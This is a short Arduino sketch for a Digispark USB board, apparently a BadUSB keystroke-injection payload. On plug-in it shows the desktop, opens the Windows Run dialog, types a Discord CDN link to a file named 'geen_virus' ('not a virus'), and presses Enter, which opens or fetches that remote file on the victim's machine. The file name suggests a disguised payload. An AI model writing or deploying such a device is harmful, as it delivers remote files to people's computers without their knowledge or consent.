#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:

}

void loop() {
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(800);
DigiKeyboard.print("https://cdn.discordapp.com/attachments/1131873496566345749/1131874025979781190/geen_virus");
DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
for(;;)
  {
  }
}
